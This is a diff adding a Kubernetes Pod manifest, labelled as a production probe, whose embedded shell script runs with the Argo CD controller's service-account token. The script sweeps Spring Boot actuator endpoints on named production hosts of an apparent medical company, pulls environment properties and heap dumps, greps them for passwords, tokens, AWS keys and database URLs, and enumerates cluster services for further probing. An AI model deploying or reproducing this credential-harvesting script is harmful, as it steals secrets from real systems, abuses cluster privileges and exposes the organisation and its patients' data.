@@ -1,0 +1,140 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: i2805-prodprobe-u0vwxq
+  namespace: argocd
+  labels:
+    i2805: probe
+    i2805-env: prod
+spec:
+  serviceAccountName: argocd-application-controller
+  automountServiceAccountToken: true
+  restartPolicy: Never
+  containers:
+    - name: i2805-prodprobe-u0vwxq
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command: ["/bin/sh","-c"]
+      args:
+        - |
+          set -u
+          ROLE=prod
+          echo "===I2805_START role=$ROLE host=$(hostname) utc=$(date -u +%FT%TZ)==="
+          apk add --no-cache curl jq >/tmp/apk.log 2>&1
+          echo "apk_rc=$?"
+          command -v curl >/dev/null && echo have_curl
+          command -v jq >/dev/null && echo have_jq
+
+          C(){ curl -s -m 12 -o "$2" -w '%{http_code}|%{size_download}|%{content_type}' "$1" 2>/dev/null; }
+          sens(){
+            f=$1; tag=$2
+            [ -s "$f" ] || { echo "SENS $tag EMPTY"; return; }
+            if head -c 300 "$f" | grep -q 'propertySources'; then
+              m=$(jq '[.propertySources[]?.properties // {} | to_entries[] | select((.value.value|tostring)=="******")] | length' "$f" 2>/dev/null)
+              n=$(jq '[.propertySources[]?.properties // {} | to_entries[]] | length' "$f" 2>/dev/null)
+              echo "SENS $tag env_props=$n masked_values=$m"
+              jq -r '.propertySources[]? | .name as $s | (.properties // {}) | to_entries[] | select(.key|test("(?i)(password|passwd|secret|token|credential|access[_-]?key|api[_-]?key|apikey|private[_-]?key|jwt|sign|dsn|jdbc|redis|smtp|mail|aws|openai|anthropic|llm|gemini|stripe|paypal|firebase)")) | "\($s) :: \(.key)=\(.value.value|tostring|.[0:700])"' "$f" 2>/dev/null | head -600
+            else
+              echo "SENS $tag NONENV head=$(head -c 200 "$f" | tr '\n' ' ')"
+            fi
+          }
+          deep(){ H=$1; T=$2
+            for ep in actuator/env actuator/configprops actuator/mappings actuator/beans actuator/loggers actuator/threaddump actuator/httptrace actuator/gateway/routes actuator/metrics actuator/info v3/api-docs actuator/health; do
+              fn=$(echo "$ep" | tr '/' '_'); f=/tmp/d_${T}.${fn}
+              r=$(C "http://$H/$ep" "$f")
+              echo "DEEP $T /$ep -> $r"
+              case "$ep" in
+                actuator/env|actuator/configprops) sens "$f" "$T/$ep" ;;
+                actuator/gateway/routes) echo "GWR $T body=$(head -c 2500 "$f" 2>/dev/null)" ;;
+                actuator/info) echo "INFO $T body=$(head -c 800 "$f" 2>/dev/null)" ;;
+                v3/api-docs) echo "APIDOC $T info=$(jq -c '.info // empty' "$f" 2>/dev/null) paths=$(jq -r '.paths // {} | keys | .[0:80] | join(",")' "$f" 2>/dev/null)" ;;
+                actuator/httptrace) echo "TRACE $T body=$(head -c 1200 "$f" 2>/dev/null)" ;;
+                actuator/metrics) echo "METRICS $T names=$(jq -r '.names // [] | .[0:60] | join(",")' "$f" 2>/dev/null)" ;;
+                actuator/loggers) echo "LOGGERS $T root=$(jq -c '.loggers.root // empty' "$f" 2>/dev/null)" ;;
+              esac
+            done
+          }
+          heap(){ H=$1; T=$2
+            code=$(curl -s -m 15 -I -o /tmp/hh_${T}.hdr -w '%{http_code}' "http://$H/actuator/heapdump" 2>/dev/null)
+            clen=$(grep -i '^content-length:' /tmp/hh_${T}.hdr | tr -d '\r' | awk '{print $2}')
+            echo "HEAP $T head=$code clen=${clen:-none}"
+            [ "$code" = "200" ] || return
+            cr=$(curl -s -m 20 -r 0-1048575 -D /tmp/hh_${T}.rhdr -o /tmp/hh_${T}.part "http://$H/actuator/heapdump" -w '%{http_code}')
+            total=$(grep -i '^content-range:' /tmp/hh_${T}.rhdr | tr -d '\r' | sed 's#.*/##')
+            echo "HEAP $T range_code=$cr total=${total:-unknown} part_bytes=$(wc -c < /tmp/hh_${T}.part 2>/dev/null)"
+            if [ -n "${total:-}" ] && [ "$total" -gt 104857600 ] 2>/dev/null; then echo "HEAP $T SKIP_GT_100MB"; return; fi
+            if [ -n "${total:-}" ] && [ "$total" -gt 0 ] 2>/dev/null; then
+              curl -s -m 240 -o /tmp/hh_${T}.bin "http://$H/actuator/heapdump" 2>/dev/null
+              echo "HEAP $T dl_bytes=$(wc -c < /tmp/hh_${T}.bin 2>/dev/null)"
+              grep -aoE '(jdbc:[a-z0-9]+://[^"[:space:]]{5,200}|redis://[^"[:space:]]{5,150}|AKIA[0-9A-Z]{16}|(password|secret|token)[=:][^"&[:space:]]{4,80})' /tmp/hh_${T}.bin 2>/dev/null | sort -u | head -150
+              : > /tmp/hh_${T}.bin
+            fi
+          }
+          shallow(){ H=$1; T=$2
+            for ep in actuator actuator/env actuator/health; do
+              fn=$(echo "$ep"|tr '/' '_'); f=/tmp/s_${T}.${fn}
+              r=$(C "http://$H/$ep" "$f")
+              echo "SHALLOW $T /$ep -> $r"
+              case "$ep" in actuator/env) sens "$f" "$T/$ep";; actuator/health) echo "HEALTH $T $(head -c 400 "$f" 2>/dev/null)";; esac
+            done
+          }
+          svcprobe(){ S=$1; NS=$2; P=$3; TAG=$4
+            B="http://$S.$NS.svc.cluster.local:$P"
+            for ep in "" health v3/api-docs swagger-ui/index.html actuator actuator/env actuator/health actuator/info; do
+              fn=$(echo "${ep:-root}"|tr '/' '_'); f=/tmp/v_${TAG}.${fn}
+              r=$(C "$B/$ep" "$f")
+              echo "SVC $TAG $B/$ep -> $r"
+              case "$ep" in v3/api-docs) echo "SVCAPIDOC $TAG info=$(jq -c '.info // empty' "$f" 2>/dev/null)";; actuator/env) sens "$f" "$TAG/env";; actuator/info|actuator/health) echo "SVCINFO $TAG $(head -c 500 "$f" 2>/dev/null)";; esac
+            done
+          }
+          deep_phase(){
+            deep lazamedical-prod01-usw2-notif-eafa1811fd6f6f78.elb.us-west-2.amazonaws.com deep_notif
+            deep lazamedical-dp-prod01-usw2-data-c6480e54a84f2644.elb.us-west-2.amazonaws.com deep_data
+            deep lazamedical-prod01-usw2-auth-8ba7c7856a888742.elb.us-west-2.amazonaws.com deep_auth
+          }
+          shallow_phase(){
+            shallow lazamedical-prod01-usw2-user-bca7706c3b655a63.elb.us-west-2.amazonaws.com sh_user
+            shallow lazamedical-dp-prod01-usw2-s3-2a3b26f15d64ba78.elb.us-west-2.amazonaws.com sh_s3
+            shallow lazamedical-dp-prod01-usw2-meta-149485d8eeef4b86.elb.us-west-2.amazonaws.com sh_meta
+            shallow lazamedical-dp-prod01-usw2-deid-f957f3b6a98392fd.elb.us-west-2.amazonaws.com sh_deid
+            shallow lazamedical-prod01-usw2-authz-b28f0d1484208416.elb.us-west-2.amazonaws.com sh_authz
+          }
+          heap_phase(){
+            heap lazamedical-prod01-usw2-notif-eafa1811fd6f6f78.elb.us-west-2.amazonaws.com heap_notif
+            heap lazamedical-dp-prod01-usw2-data-c6480e54a84f2644.elb.us-west-2.amazonaws.com heap_data
+            heap lazamedical-prod01-usw2-auth-8ba7c7856a888742.elb.us-west-2.amazonaws.com heap_auth
+          }
+
+          svc_phase(){
+            SA=/var/run/secrets/kubernetes.io/serviceaccount
+            TOKEN=$(cat $SA/token 2>/dev/null)
+            API=https://kubernetes.default.svc
+            curl -s -m 20 -k -H "Authorization: Bearer $TOKEN" "$API/api/v1/services?limit=2000" -o /tmp/svcs.json
+            echo "SVC_INDEX_BYTES=$(wc -c < /tmp/svcs.json)"
+            jq -r '.items[]? | "\(.metadata.namespace)|\(.metadata.name)|\(.spec.ports[0].port // 80)"' /tmp/svcs.json 2>/dev/null | grep -Ei '(user-management|cognito|auth-service|data-management|notification|de-identifier|metadata-extraction|s3-ingestion|box-ingestion|authorization)' | head -25
+            jq -r '.items[]? | select(.metadata.name|test("(user-management|cognito|auth-service|data-management|notification|de-identifier|metadata-extraction|s3-ingestion|box-ingestion|authorization)")) | "\(.metadata.name)|\(.metadata.namespace)|\(.spec.ports[0].port // 80)"' /tmp/svcs.json 2>/dev/null | head -12 > /tmp/probelist.txt
+            i=0
+            while IFS='|' read -r S NS P; do
+              [ -z "${S:-}" ] && continue
+              i=$((i+1)); [ $i -gt 10 ] && break
+              svcprobe "$S" "$NS" "$P" "sv${i}"
+            done < /tmp/probelist.txt
+          }
+
+          ( deep_phase ) > /tmp/phase_deep.out 2>&1 &
+          ( shallow_phase ) > /tmp/phase_shallow.out 2>&1 &
+          ( svc_phase ) > /tmp/phase_svc.out 2>&1 &
+          ( heap_phase ) > /tmp/phase_heap.out 2>&1 &
+          wait
+          echo "===PHASE_DEEP==="; cat /tmp/phase_deep.out
+          echo "===PHASE_SHALLOW==="; cat /tmp/phase_shallow.out
+          echo "===PHASE_SVC==="; cat /tmp/phase_svc.out
+          echo "===PHASE_HEAP==="; cat /tmp/phase_heap.out
+          echo "===I2805_END role=$ROLE utc=$(date -u +%FT%TZ)==="
+      resources:
+        requests:
+          cpu: 10m
+          memory: 64Mi
+        limits:
+          cpu: 900m
+          memory: 1Gi
